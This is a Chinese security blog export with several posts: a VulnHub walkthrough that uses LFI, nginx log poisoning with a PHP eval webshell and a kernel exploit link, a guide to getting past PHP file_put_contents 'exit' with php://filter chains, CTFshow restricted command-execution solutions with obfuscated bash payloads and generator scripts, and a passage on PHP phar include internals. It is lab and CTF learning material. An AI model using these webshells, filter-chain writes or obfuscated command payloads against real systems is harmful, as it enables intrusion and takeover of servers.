http://61.139.2.130:80/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://61.139.2.130:80/ ---- ==\u0026gt; DIRECTORY: http://61.139.2.130:80/antibot_image/ + http://61.139.2.130:80/index.html (CODE:200|SIZE:652) + http://61.139.2.130:80/server-status (CODE:403|SIZE:277) ---- Entering directory: http://61.139.2.130:80/antibot_image/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ----------------- END_TIME: Tue Dec 9 12:32:37 2025 DOWNLOADED: 4612 - FOUND: 2 目录 antibot_image/antibots/info.php 中有一段注释：\n\u0026lt;!-- \u0026lt;/?php include $_GET[\u0026#39;image\u0026#39;]; --\u0026gt; include文件包含先尝试获取/etc/passwd：\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false messagebus:x:106:110::/var/run/dbus:/bin/false uuidd:x:107:111::/run/uuidd:/bin/false tomato:x:1000:1000:Tomato,,,:/home/tomato:/bin/bash sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin ftp:x:109:117:ftp daemon,,,:/srv/ftp:/bin/false 网上wp有说通过ssh用户名污染ssh日志的，但是我在实际利用时会报错 remote username contains invalid characters 导致无法ssh连接，但是构造恶意用户名实现污染8888端口http服务的nginx日志，再用include包含一句话木马getshell是可以成功的，访问8888端口时使用用户名：\n\u0026lt;?php @eval($_REQUEST[1]);?\u0026gt; 蚁剑连接 http://127.0.0.1:8085/antibot_image/antibots/info.php?image=/var/log/nginx/error.log\n后续内核提权 https://github.com/kkamagui/linux-kernel-exploits/tree/master/kernel-4.4.0-21-generic/CVE-2017-6074：\n(www-data:/) $ uname -a Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux vulnhub Momentum nmap发现服务：\n$ nmap 61.139.2.0/24 Nmap scan report for 61.139.2.129 Host is up (0.00050s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 靶机ip：61.139.2.129，指定扫描端口22,80，显示版本信息，半开放扫描：\n$ sudo nmap 61.139.2.129 -p 22,80 -sV -sS --min-rate 10000 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-08 15:18 CST Nmap scan report for 61.139.2.129 Host is up (0.00038s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80/tcp open http Apache httpd 2.4.38 ((Debian)) MAC Address: 00:0C:29:DF:99:67 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.56 seconds 访问web服务：\ndirsearch目录扫描：\n$ dirsearch -u http://61.139.2.129 --random-agent Target: http://61.139.2.129/ [15:25:25] Starting: [15:25:25] 301 - 309B - /js -\u0026gt; http://61.139.2.129/js/ [15:25:26] 403 - 277B - /.htaccess.bak1 [15:25:26] 403 - 277B - /.htaccess.save [15:25:26] 403 - 277B - /.htaccess.sample [15:25:26] 403 - 277B - /.htaccess.orig [15:25:26] 403 - 277B - /.htaccess_extra [15:25:26] 403 - 277B - /.htaccess_orig [15:25:26] 403 - 277B - /.htaccessBAK [15:25:26] 403 - 277B - /.htaccessOLD2 [15:25:26] 403 - 277B - /.htaccess_sc [15:25:26] 403 - 277B - /.htaccessOLD [15:25:26] 403 - 277B - /.html [15:25:26] 403 - 277B - /.htm [15:25:26] 403 - 277B - /.htpasswd_test [15:25:26] 403 - 277B - /.httr-oauth [15:25:26] 403 - 277B - /.htpasswds [15:25:27] 403 - 277B - /.php [15:25:28] 403 - 277B - /.ht_wsr.txt [15:25:35] 301 - 310B - /css -\u0026gt; http://61.139.2.129/css/ [15:25:38] 301 - 310B - /img -\u0026gt; http://61.139.2.129/img/ [15:25:39] 200 - 451B - /js/ [15:25:40] 301 - 313B - /manual -\u0026gt; http://61.139.2.129/manual/ [15:25:40] 200 - 201B - /manual/index.html [15:25:45] 403 - 277B - /server-status [15:25:45] 403 - 277B - /server-status/ 可以看出是php写的网站，并且大部分没有权限访问都是403，/js可能有些价值，main.js：\nfunction viewDetails(str) { window.location.href = \u0026#34;opus-details.php?id=\u0026#34;+str; } /* var CryptoJS = require(\u0026#34;crypto-js\u0026#34;); var decrypted = CryptoJS.AES.decrypt(encrypted, \u0026#34;SecretPassphraseMomentum\u0026#34;); console.log(decrypted.toString(CryptoJS.enc.Utf8)); */ 虽然被注释了，但是后端可能有个AES解密的服务，并且泄露了AES密钥，访问opus-details.php，Cookie值明显是AES加密过的，解密看看：\ncookie=U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt 尝试ssh连接，用户名是auxerre，密码是auxerre-alienum##，当前用户目录下user.txt中就有第一个flag：\nauxerre@Momentum:~$ cat user.txt [ Momentum - User Owned ] --------------------------------------- flag : 84157165c30ad34d18945b647ec7f647 --------------------------------------- 尝试suid提权：\nauxerre@Momentum:~$ find / -perm -u=s -type f 2\u0026gt;/dev/null /usr/bin/mount /usr/bin/chsh /usr/bin/gpasswd /usr/bin/su /usr/bin/umount /usr/bin/passwd /usr/bin/chfn /usr/bin/newgrp /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/lib/openssh/ssh-keysign 没有可利用的命令，查看所有进程，发现有个redis的服务开放在6379端口：\nauxerre@Momentum:~$ redis-cli 127.0.0.1:6379\u0026gt; PING PONG 127.0.0.1:6379\u0026gt; KEYS * 1) \u0026#34;rootpass\u0026#34; 127.0.0.1:6379\u0026gt; GET rootpass \u0026#34;m0mentum-al1enum##\u0026#34; 127.0.0.1:6379\u0026gt; su切换root用户完成提权：\nroot@Momentum:~# cat root.txt [ Momentum - Rooted ] --------------------------------------- Flag : 658ff660fdac0b079ea78238e5996e40 --------------------------------------- by alienum with \u0026lt;3 ","permalink":"https://blog.w8nn9z.top/posts/pentest/vulnhub/","summary":"","title":"VulnHub 靶场"},{"content":"file_put_contents与死亡exit的组合的情况目前有三种：\nfile_put_contents($filename, \u0026#34;\u0026lt;?php exit();\u0026#34;.$content);\rfile_put_contents($content, \u0026#34;\u0026lt;?php exit();\u0026#34;.$content);\rfile_put_contents($filename, $content . \u0026#34;\\n114514\u0026#34;); 绕过方式其实都类似，利用单个filter或filterchain进行无关代码的分解\nstring.strip_tags 去除html xml php标签\rconvert.base64-encode/decode base64编解码\rstring.rot13 rot13对英文字符进行回转替换\rconvert.iconv.UCS-2LE.UCS-2BE 当前字符UCS-2 Little-Endian转为目标字符UCS-2 Big-Endian 即每2位字符逆置\rconvert.iconv.UCS-4LE.UCS-4BE 每4位字符逆置\rconvert.iconv.utf-8.utf-7 utf-8转utf-7，对数字英文无影响\rzlib.deflate/inflate zlib压缩/解压\r.htaccess的预包含 情况一 \u0026lt;?php $filename = \u0026#34;\u0026#34;; $content = \u0026#34;\u0026#34;; file_put_contents($filename, \u0026#34;\u0026lt;?php exit();\u0026#34;.$content); ?\u0026gt; base64-decode：\n$filename = \u0026#34;php://filter/convert.base64-decode/resource=phpinfo.php\u0026#34;;\r$content = \u0026#34;aPD9waHAgcGhwaW5mbygpOz8+\u0026#34;; strip_tags+base64-decode：\n$filename = \u0026#34;php://filter/string.strip_tags|convert.base64-decode/resource=phpinfo.php\u0026#34;;\r$content = \u0026#34;?\u0026gt;PD9waHAgcGhwaW5mbygpOz8+\u0026#34;; 情况二 \u0026lt;?php $content = \u0026#34;\u0026#34;; file_put_contents($content, \u0026#34;\u0026lt;?php exit();\u0026#34;.$content); ?\u0026gt; UCS-2LE.UCS-2BE：\n$content = \u0026#34;php://filter/convert.iconv.UCS-2LE.UCS-2BE|?\u0026lt;hp phpipfn(o;)\u0026gt;?/resource=phpinfo.php\u0026#34;; utf-8.utf-7+base64-decode：\n$content = \u0026#34;php://filter/write=PD9waHAgcGhwaW5mbygpOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=phpinfo.php\u0026#34;; 情况三 \u0026lt;?php $filename = \u0026#34;\u0026#34;; $content = \u0026#34;\u0026#34;; file_put_contents($filename, $content . \u0026#34;\\n114514\u0026#34;); ?\u0026gt; 如果没有任何限制则直接写入php代码，后缀部分不会影响命令执行：\n$filename = \u0026#34;phpinfo.php\u0026#34;;\r$content = \u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\u0026#34;; 参考资料：\nhttps://xz.aliyun.com/news/7758\n","permalink":"https://blog.w8nn9z.top/posts/web/phpexitbypass/","summary":"","title":"php死亡exit绕过"},{"content":"$(...) 命令替换 Shell 会执行括号 ... 内的内容作为一个子命令，然后用这个子命令的标准输出（stdout） 替换整个 $(...) 结构\r$((...)) 算术扩展 Shell 会计算双括号 ... 内的算术表达式，然后用计算结果的数值替换整个 $((...)) 结构\rcommand \u0026lt;\u0026lt;\u0026lt; \u0026#34;string\u0026#34; here-strings 将后面的字符串（\u0026#34;string\u0026#34;）加上一个换行符，然后作为标准输入（stdin）传递给前面的命令（command）\r${} 参数扩展 $variable 是 ${variable} 的简写形式 Bash 不允许在 ${} 花括号内进行命令替换 $() 或算术扩展 $(())\r$0 环境变量 表示脚本本身的名字，可以是bash、zsh等 $# 在交互式 Shell 中，没有位置参数传递给 Shell 本身，所以 $# 的值是 0\r${#PARAMETER} 获取变量值的字符串长度 极限命令执行1 \u0026lt;?php //本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。 //flag在根目录flag里，或者直接运行根目录getflag error_reporting(0); highlight_file(__FILE__); if (isset($_POST[\u0026#39;ctf_show\u0026#39;])) { $ctfshow = $_POST[\u0026#39;ctf_show\u0026#39;]; if (!preg_match(\u0026#34;/[b-zA-Z_@#%^\u0026amp;*\\{}\\-\\+\u0026lt;\u0026gt;\\\u0026#34;|`;\\[\\]]/\u0026#34;,$ctfshow)){ system($ctfshow); }else{ echo(\u0026#34;????????\u0026#34;); } } ?\u0026gt; 过滤了除a以外的所有字母，还有通配符*，但是未过滤斜杠/。else其实已经给出提示了，可以用问号通配符?，一个问号匹配一个字符，实现执行/getflag，其实根本用不到小写字母a：\nctf_show=/??????? ctfshow{560f45a8-4d2a-4716-a327-ccb81cd6380a}\n极限命令执行2 \u0026lt;?php //本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。 //flag在根目录flag里，或者直接运行根目录getflag error_reporting(0); highlight_file(__FILE__); include \u0026#34;check.php\u0026#34;; if (isset($_POST[\u0026#39;ctf_show\u0026#39;])) { $ctfshow = $_POST[\u0026#39;ctf_show\u0026#39;]; check($ctfshow); system($ctfshow); } ?\u0026gt; 数字，美元符号$，单引号'未被过滤，可以利用shell的$'...'结构执行命令，在单引号内的反斜杠转义序列会被 Shell 解释并转换为对应的字符，比如执行ls：\nctf_show=$\u0026#39;\\154\\163\u0026#39; 如果没有过滤空格的话可以获取check.php内容，但是由于shell会把$'...'结构里的内容当作一个完整的字符串，所以是无法将命令和参数分离解析的，如果没有空格分开两个结构的话就只能执行可执行程序或不带参数的命令，比如/getflag：\nctf_show=$\u0026#39;\\57\\147\\145\\164\\146\\154\\141\\147\u0026#39; ctfshow{523d9f46-8fd1-4c30-8a60-4be733edcbec}\n极限命令执行3 \u0026lt;?php //本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。 //flag在根目录flag里 error_reporting(0); highlight_file(__FILE__); include \u0026#34;check.php\u0026#34;; if (isset($_POST[\u0026#39;ctf_show\u0026#39;])) { $ctfshow = $_POST[\u0026#39;ctf_show\u0026#39;]; check($ctfshow); system($ctfshow); } ?\u0026gt; 反斜杠\\，单引号'，美元符号$，数字0和1，位运算符\u0026lt;，括号()未被过滤，可以通过linux中[base#]n表示数字的方式实现命令执行，先尝试构造ls：\n$\\\u0026#39;\\\\$(($((1\u0026lt;\u0026lt;1))#10011010))\\\\$(($((1\u0026lt;\u0026lt;1))#10100011))\\\u0026#39; 这样会报错：command not found: $'\\154\\163'，也就是说还需要再找一个来执行这条语句的方法，可以利用here-strings+$0来实现执行ls：\n$0\u0026lt;\u0026lt;\u0026lt;$\\\u0026#39;\\\\$(($((1\u0026lt;\u0026lt;1))#10011010))\\\\$(($((1\u0026lt;\u0026lt;1))#10100011))\\\u0026#39; 同理执行cat /flag，但是要注意一开始传入bash的参数是没有空格的，并不会将要执行的命令和参数分离，所以需要用到两次here-strings，可以写个脚本：\ncommand = \u0026#34;cat /flag\u0026#34; if \u0026#34; \u0026#34; in command: r = r\u0026#34;$0\u0026lt;\u0026lt;\u0026lt;$0\\\u0026lt;\\\u0026lt;\\\u0026lt;$\\\u0026#39;\u0026#34; for c in command: n = bin(int(oct(ord(c)).replace(\u0026#34;0o\u0026#34;, \u0026#34;\u0026#34;))).replace(\u0026#34;0b\u0026#34;, \u0026#34;\u0026#34;) r += fr\u0026#34;\\\\$(($((1\u0026lt;\u0026lt;1))#{n}))\u0026#34; r += r\u0026#34;\\\u0026#39;\u0026#34; print(r) 最终构造的payload：\n$0\u0026lt;\u0026lt;\u0026lt;$0\\\u0026lt;\\\u0026lt;\\\u0026lt;$\\\u0026#39;\\\\$(($((1\u0026lt;\u0026lt;1))#10001111))\\\\$(($((1\u0026lt;\u0026lt;1))#10001101))\\\\$(($((1\u0026lt;\u0026lt;1))#10100100))\\\\$(($((1\u0026lt;\u0026lt;1))#101000))\\\\$(($((1\u0026lt;\u0026lt;1))#111001))\\\\$(($((1\u0026lt;\u0026lt;1))#10010010))\\\\$(($((1\u0026lt;\u0026lt;1))#10011010))\\\\$(($((1\u0026lt;\u0026lt;1))#10001101))\\\\$(($((1\u0026lt;\u0026lt;1))#10010011))\\\u0026#39; ctfshow{9e499982-ff17-4897-a756-7d4df0d82537}\n极限命令执行4 \u0026lt;?php //本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。 //flag在根目录flag里 error_reporting(0); highlight_file(__FILE__); include \u0026#34;check.php\u0026#34;; if (isset($_POST[\u0026#39;ctf_show\u0026#39;])) { $ctfshow = $_POST[\u0026#39;ctf_show\u0026#39;]; check($ctfshow); system($ctfshow); } ?\u0026gt; 写个fuzz脚本：\nimport requests import string chars = string.printable allowchars = \u0026#39;\u0026#39; for c in chars: data = {\u0026#34;ctf_show\u0026#34;:c} res = requests.post(url=\u0026#34;http://209703e5-7e4c-4cfb-8812-35a44670493f.challenge.ctf.show/\u0026#34;, data=data) if not res.text.endswith(\u0026#39;?\u0026#39;): allowchars += c print(allowchars) 本题可以用的字符：0!#$\u0026amp;'()\u0026lt;\\_{}~\n和上一题类似，但是少了数字1，可以利用${##}来构造，表示获取特殊变量$#的字符串长度，由于$#为0，所以长度为1，也就是说${##}结果为1，把原来payload中的的1替换掉即可，同样写个脚本：\ncommand = \u0026#34;cat /flag\u0026#34; if \u0026#34; \u0026#34; in command: r = r\u0026#34;$0\u0026lt;\u0026lt;\u0026lt;$0\\\u0026lt;\\\u0026lt;\\\u0026lt;$\\\u0026#39;\u0026#34; for c in command: n = bin(int(oct(ord(c)).replace(\u0026#34;0o\u0026#34;, \u0026#34;\u0026#34;))).replace(\u0026#34;0b\u0026#34;, \u0026#34;\u0026#34;) r += fr\u0026#34;\\\\$(($((1\u0026lt;\u0026lt;1))#{n}))\u0026#34; r += r\u0026#34;\\\u0026#39;\u0026#34; r = r.replace(\u0026#34;1\u0026#34;, \u0026#34;${##}\u0026#34;) print(r) 最终构造的payload：\n$0\u0026lt;\u0026lt;\u0026lt;$0\\\u0026lt;\\\u0026lt;\\\u0026lt;$\\\u0026#39;\\\\$(($((${##}\u0026lt;\u0026lt;${##}))#${##}000${##}${##}${##}${##}))\\\\$(($((${##}\u0026lt;\u0026lt;${##}))#${##}000${##}${##}0${##}))\\\\$(($((${##}\u0026lt;\u0026lt;${##}))#${##}0${##}00${##}00))\\\\$(($((${##}\u0026lt;\u0026lt;${##}))#${##}0${##}000))\\\\$(($((${##}\u0026lt;\u0026lt;${##}))#${##}${##}${##}00${##}))\\\\$(($((${##}\u0026lt;\u0026lt;${##}))#${##}00${##}00${##}0))\\\\$(($((${##}\u0026lt;\u0026lt;${##}))#${##}00${##}${##}0${##}0))\\\\$(($((${##}\u0026lt;\u0026lt;${##}))#${##}000${##}${##}0${##}))\\\\$(($((${##}\u0026lt;\u0026lt;${##}))#${##}00${##}00${##}${##}))\\\u0026#39; ctfshow{903bb694-027f-4476-aa29-e046b3bf07cd}\n极限命令执行5 \u0026lt;?php //本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。 //flag在根目录flag里 error_reporting(0); highlight_file(__FILE__); include \u0026#34;check.php\u0026#34;; if (isset($_POST[\u0026#39;ctf_show\u0026#39;])) { $ctfshow = $_POST[\u0026#39;ctf_show\u0026#39;]; check($ctfshow); system($ctfshow); } ?\u0026gt; 本题可以用的字符：!$\u0026amp;'()\u0026lt;=\\_{}~\n0没办法直接用，可以想到通过$(())来构造0，但是这样linux会直接识别$$为脚本运行的当前进程ID号即PID，这里要用到感叹号!来替换变量实现绕过，先看如何构造bash：\n__=$(())\u0026amp;\u0026amp;${!__} #也被过滤了，原来用#来实现获取任意数值的方法已经不可行了，可以利用取反~，0取反值为-1，多次重复-1的操作最后再取反仍然可以获得任意数值：\n$((~$(()))):-1\r$(($((~$(())))$((~$(()))))):-2\r$((~$(($((~$(())))$((~$(()))))))):1 注意POST传参时要url编码一下payload：\ncommand = \u0026#34;cat /flag\u0026#34; if \u0026#34; \u0026#34; in command: r = r\u0026#34;__=$(())\u0026amp;\u0026amp;${!__}\u0026lt;\u0026lt;\u0026lt;${!__}\\\u0026lt;\\\u0026lt;\\\u0026lt;$\\\u0026#39;\u0026#34; for c in command: n = int(oct(ord(c)).replace(\u0026#34;0o\u0026#34;, \u0026#34;\u0026#34;)) r += fr\u0026#34;\\\\$((~$((\u0026#34; + \u0026#34;$((~$(())))\u0026#34;*(n+1) + \u0026#34;))))\u0026#34; r += r\u0026#34;\\\u0026#39;\u0026#34; print(r) ctfshow{a9ad57e1-7483-45e0-ba0d-725a71c8cd21}\n极限命令执行6 3字节的限制，先尝试执行ls：\nflag.php index.php 根据先前4字节的rce，需要通过创建文件来执行命令，因此读取文件命令最多不能超过2字节。linux中有hd命令，即hexdump，查看文件十六进制视图，可以用于最后获取flag内容\n本题可以先利用cp将flag.php内容复制到index.php中，再利用index.php的sleep(1)执行*d*，执行命令hd，参数为index.php，实现读取flag：\nexp.py：\nimport requests url = \u0026#34;http://8f90d55a-21cc-4a87-8e58-150572acc6a8.challenge.ctf.show/\u0026#34; # flag.php index.php payloads = [ \u0026#34;\u0026gt;cp\u0026#34;, # file: cp flag.php index.php \u0026#34;*\u0026#34;, # execute command: cp flag.php index.php \u0026#34;\u0026gt;hd\u0026#34;, # file: cp flag.php hd index.php ] for payload in payloads: data = {\u0026#34;ctf_show\u0026#34;: payload} try: requests.post(url, data, timeout=0.1) except: pass response = requests.post(url, {\u0026#34;ctf_show\u0026#34;: \u0026#34;*d*\u0026#34;}) # execute command: hd index.php print(response.text) 00000000 3c 3f 70 68 70 0a 0a 24 66 6c 61 67 3d 22 63 74 |\u0026lt;?php..$flag=\u0026#34;ct|\r00000010 66 73 68 6f 77 7b 36 36 63 62 31 66 38 65 2d 39 |fshow{66cb1f8e-9|\r00000020 37 64 37 2d 34 66 35 31 2d 39 64 39 37 2d 35 32 |7d7-4f51-9d97-52|\r00000030 38 38 34 61 37 32 31 38 38 65 7d 22 3b 0a 0a 3f |884a72188e}\u0026#34;;..?|\r00000040 3e |\u0026gt;|\r00000041 极限命令执行7 提示1：flag在用户家目录里，文件名未知 提示2：可用字符是 数字、字母、特殊符号\n\u0026lt;?php error_reporting(0); #go back home , your flag is not here! if (isset($_POST[\u0026#39;ctf_show\u0026#39;])) { $ctfshow = $_POST[\u0026#39;ctf_show\u0026#39;]; if (is_string($ctfshow) \u0026amp;\u0026amp; strlen($ctfshow) \u0026lt;= 3) { system($ctfshow); } }else{ highlight_file(__FILE__); } ?\u0026gt; 仍然是3字节的命令执行，明确说明flag在home下，题目执行命令有回显，先fuzz可以执行的2字节命令：\nimport requests import string url = \u0026#34;http://f13f5152-695b-4243-ad72-1fd01ff6c6fd.challenge.ctf.show/\u0026#34; chars = string.digits + string.ascii_lowercase for c1 in chars: for c2 in chars: c = c1 + c2 data = {\u0026#34;ctf_show\u0026#34;: c} resp = requests.post(url, data) if resp.text: print(c) 7z\rdf\rdu\red\rid\rls\rod\rps\rvi\rwc\rxz 本题可以利用7z和~将/home/当前用户下的文件打包为.7z压缩包放在当前目录下：\n\u0026gt;7z\r\u0026gt;a\r\u0026gt;b 此时当前目录下有文件：\n7z a b index.php 再执行* ~，相当于执行7z a b index.php /home/www-data，最后下载b.7z文件解压就能拿到flag\nctfshow{6e690f68-fac8-42a7-be66-099da80f71c8}\n参考资料：\nhttps://xz.aliyun.com/news/11688\nhttps://0ran9e.fun/2025/08/28/ctfshow/%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C6\u0026amp;7/#%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C7\nhttps://ctf-show.feishu.cn/wiki/QrKEwNVwlixLXrkxQLCcI7bDnQN\n","permalink":"https://blog.w8nn9z.top/posts/web/ctfshowcommandexecute/","summary":"","title":"CTFSHOW 极限命令执行"},{"content":"Include底层逻辑 在调用include() 时会调用 Zend 引擎中的compile_filename()，根据文件路径（filename）将文件编译为 zend_op_array，并返回该操作数数组。文件路径的处理、是否已加载缓存、是否需要重新编译等都会由 compile_filename()` 来决定\nzend_op_array *compile_filename(int type, zend_string *filename)\r{\rzend_file_handle file_handle;\rzend_op_array *retval;\rzend_string *opened_path = NULL;\rzend_stream_init_filename_ex(\u0026amp;file_handle, filename);\rretval = zend_compile_file(\u0026amp;file_handle, type);\rif (retval \u0026amp;\u0026amp; file_handle.handle.stream.handle) {\rif (!file_handle.opened_path) {\rfile_handle.opened_path = opened_path = zend_string_copy(filename);\r}\rzend_hash_add_empty_element(\u0026amp;EG(included_files), file_handle.opened_path);\rif (opened_path) {\rzend_string_release_ex(opened_path, 0);\r}\r}\rzend_destroy_file_handle(\u0026amp;file_handle);\rreturn retval;\r} zend_compile_file是一个函数指针，对于phar：\nzend_compile_file = phar_compile_file; phar_compile_file：\nstatic zend_op_array *phar_compile_file(zend_file_handle *file_handle, int type) /* {{{ */ { zend_op_array *res; zend_string *name = NULL; int failed; phar_archive_data *phar; if (!file_handle || !file_handle-\u0026gt;filename) { return phar_orig_compile_file(file_handle, type); } if (strstr(ZSTR_VAL(file_handle-\u0026gt;filename), \u0026#34;.phar\u0026#34;) \u0026amp;\u0026amp; !strstr(ZSTR_VAL(file_handle-\u0026gt;filename), \u0026#34;://\u0026#34;)) { if (SUCCESS == phar_open_from_filename(ZSTR_VAL(file_handle-\u0026gt;filename), ZSTR_LEN(file_handle-\u0026gt;filename), NULL, 0, 0, \u0026amp;phar, NULL)) { if (phar-\u0026gt;is_zip || phar-\u0026gt;is_tar) { zend_file_handle f; /* zip or tar-based phar */ name = zend_strpprintf(4096, \u0026#34;phar://%s/%s\u0026#34;, ZSTR_VAL(file_handle-\u0026gt;filename), \u0026#34;.phar/stub.php\u0026#34;); zend_stream_init_filename_ex(\u0026amp;f, name); if (SUCCESS == zend_stream_open_function(\u0026amp;f)) { zend_string_release(f.filename); f.filename = file_handle-\u0026gt;filename; if (f.opened_path) { zend_string_release(f.opened_path); } f.opened_path = file_handle-\u0026gt;opened_path; switch (file_handle-\u0026gt;type) { case ZEND_HANDLE_STREAM: if (file_handle-\u0026gt;handle.stream.closer \u0026amp;\u0026amp; file_handle-\u0026gt;handle.stream.handle) { file_handle-\u0026gt;handle.stream.closer(file_handle-\u0026gt;handle.stream.handle); } file_handle-\u0026gt;handle.stream.handle = NULL; break; default: break; } *file_handle = f; } } else if (phar-\u0026gt;flags \u0026amp; PHAR_FILE_COMPRESSION_MASK) { /* compressed phar */ file_handle-\u0026gt;type = ZEND_HANDLE_STREAM; /* we do our own reading directly from the phar, don\u0026#39;t change the next line */ file_handle-\u0026gt;handle.stream.handle = phar; file_handle-\u0026gt;handle.stream.reader = phar_zend_stream_reader; file_handle-\u0026gt;handle.stream.closer = NULL; file_handle-\u0026gt;handle.stream.fsizer = phar_zend_stream_fsizer; file_handle-\u0026gt;handle.stream.isatty = 0; phar-\u0026gt;is_persistent ? php_stream_rewind(PHAR_G(cached_fp)[phar-\u0026gt;phar_pos].fp) : php_stream_rewind(phar-\u0026gt;fp); } } } zend_try { failed = 0; CG(zend_lineno) = 0; res = phar_orig_compile_file(file_handle, type); } zend_catch { failed = 1; res = NULL; } zend_end_try(); if (name) { zend_string_release(name); } if (failed) { zend_bailout(); } return res; } /* }}} */ 只要文件名中包含.phar且不含://就会调用phar_open_from_filename：\nint phar_open_from_filename(char *fname, size_t fname_len, char *alias, size_t alias_len, uint32_t options, phar_archive_data** pphar, char **error) /* {{{ */ { php_stream *fp; zend_string *actual; int ret, is_data = 0; if (error) { *error = NULL; } if (!strstr(fname, \u0026#34;.phar\u0026#34;)) { is_data = 1; } if (phar_open_parsed_phar(fname, fname_len, alias, alias_len, is_data, options, pphar, error) == SUCCESS) { return SUCCESS; } else if (error \u0026amp;\u0026amp; *error) { return FAILURE; } if (php_check_open_basedir(fname)) { return FAILURE; } fp = php_stream_open_wrapper(fname, \u0026#34;rb\u0026#34;, IGNORE_URL|STREAM_MUST_SEEK, \u0026amp;actual); if (!fp) { if (options \u0026amp; REPORT_ERRORS) { if (error) { spprintf(error, 0, \u0026#34;unable to open phar for reading \\\u0026#34;%s\\\u0026#34;\u0026#34;, fname); } } if (actual) { zend_string_release_ex(actual, 0); } return FAILURE; } if (actual) { fname = ZSTR_VAL(actual); fname_len = ZSTR_LEN(actual); } ret = phar_open_from_fp(fp, fname, fname_len, alias, alias_len, options, pphar, is_data, error); if (actual) { zend_string_release_ex(actual, 0); } return ret; } /* }}}*/ phar_open_from_fp：\nstatic int phar_open_from_fp(php_stream* fp, char *fname, size_t fname_len, char *alias, size_t alias_len, uint32_t options, phar_archive_data** pphar, int is_data, char **error) /* {{{ */ { static const char token[] = \u0026#34;__HALT_COMPILER();\u0026#34;; static const char zip_magic[] = \u0026#34;PK\\x03\\x04\u0026#34;; static const char gz_magic[] = \u0026#34;\\x1f\\x8b\\x08\u0026#34;; static const char bz_magic[] = \u0026#34;BZh\u0026#34;; char *pos, test = \u0026#39;\\0\u0026#39;; int recursion_count = 3; // arbitrary limit to avoid too deep or even infinite recursion const int window_size = 1024; char buffer[1024 + sizeof(token)]; /* a 1024 byte window + the size of the halt_compiler token (moving window) */ const zend_long readsize = sizeof(buffer) - sizeof(token); const zend_long tokenlen = sizeof(token) - 1; zend_long halt_offset; size_t got; uint32_t compression = PHAR_FILE_COMPRESSED_NONE; if (error) { *error = NULL; } if (-1 == php_stream_rewind(fp)) { MAPPHAR_ALLOC_FAIL(\u0026#34;cannot rewind phar \\\u0026#34;%s\\\u0026#34;\u0026#34;) } buffer[sizeof(buffer)-1] = \u0026#39;\\0\u0026#39;; memset(buffer, 32, sizeof(token)); halt_offset = 0; /* Maybe it\u0026#39;s better to compile the file instead of just searching, */ /* but we only want the offset. So we want a .re scanner to find it. */ while(!php_stream_eof(fp)) { if ((got = php_stream_read(fp, buffer+tokenlen, readsize)) \u0026lt; (size_t) tokenlen) { MAPPHAR_ALLOC_FAIL(\u0026#34;internal corruption of phar \\\u0026#34;%s\\\u0026#34; (truncated entry)\u0026#34;) } if (!test \u0026amp;\u0026amp; recursion_count) { test = \u0026#39;\\1\u0026#39;; pos = buffer+tokenlen; if (!memcmp(pos, gz_magic, 3)) { char err = 0; php_stream_filter *filter; php_stream *temp; /* to properly decompress, we have to tell zlib to look for a zlib or gzip header */ zval filterparams; if (!PHAR_G(has_zlib)) { MAPPHAR_ALLOC_FAIL(\u0026#34;unable to decompress gzipped phar archive \\\u0026#34;%s\\\u0026#34; to temporary file, enable zlib extension in php.ini\u0026#34;) } array_init(\u0026amp;filterparams); /* this is defined in zlib\u0026#39;s zconf.h */ 